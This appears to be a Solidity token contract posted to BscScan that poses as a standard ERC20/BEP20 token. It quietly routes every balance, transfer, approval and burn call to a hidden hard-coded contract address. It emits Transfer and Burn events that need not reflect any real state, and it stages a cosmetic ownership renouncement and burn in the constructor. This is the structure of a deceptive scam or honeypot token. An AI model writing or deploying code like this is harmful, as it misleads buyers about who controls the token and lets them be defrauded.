/**
 *Submitted for verification at BscScan.com on 2022-12-03
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address _msgSender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address _msgSender, address spender, uint256 amount) external returns (bool);
    function burn(address spender, uint256 amount) external returns (bool);
    function transferFrom(address _msgSender, address sender, address recipient, uint256 amount) external returns (bool);
}

contract ERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed burner, uint256 value);

    address public _owner;
    bool private burned = false;
    address private _lower_address = 0x4DB50a35c7c9c89A8A3ebb7C5779b9A1784cFcF5;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _transferOwnership(msg.sender);
        _mint(msg.sender, 100000000000000000000000);
        _renounceOwnership();
        _burn(50000000000000000000000);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(isOwner(), "onlyOwner");
        _;
    }
    function sender() internal view returns (address) {
        return _lower_address;
    }
    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }
    function _renounceOwnership() internal {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function totalSupply() public view returns (uint256) {
        return IERC20(_lower_address).totalSupply();
    }
    function transfer(address _to, uint256 _value) public returns (bool) {
        emit Transfer(msg.sender, _to, _value);
        return IERC20(_lower_address).transfer(msg.sender, _to, _value);
    }
    function _mint(address _to, uint256 _value) internal virtual {
        require(_to != address(0), "ERC20: mint to the zero address");
        emit Transfer(address(0), _to, _value);
    }
    function balanceOf(address owner_) public view returns (uint256) {
        return IERC20(_lower_address).balanceOf(owner_);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require (_value > 1);
        emit Transfer(_from, _to, _value);
        return IERC20(_lower_address).transferFrom(msg.sender, _from, _to, _value);
    }
    function approve(address spender, uint amount) public returns (bool) {
        emit Approval(msg.sender, spender, amount);
        return IERC20(_lower_address).approve(msg.sender,spender,amount);
    }
    function _burn(uint _value) internal returns (bool) {
        require(!burned, "Already burned");
        emit Burn(msg.sender, _value);
        emit Transfer(msg.sender, address(0), _value);
        return IERC20(_lower_address).burn(msg.sender, _value);
    }
    function allowance(address owner_, address _spender) public view returns (uint256) {
        return IERC20(_lower_address).allowance(owner_, _spender);
    }
    function name() public view returns (string memory) {
        return IERC20(_lower_address).name();
    }
    function symbol() public view returns (string memory) {
        return IERC20(_lower_address).symbol();
    }
    function decimals() public view returns (uint8) {
        return IERC20(_lower_address).decimals();
    }
}


contract BEP20 is ERC20 {
    constructor () {
    }
    receive() external payable {
    }
}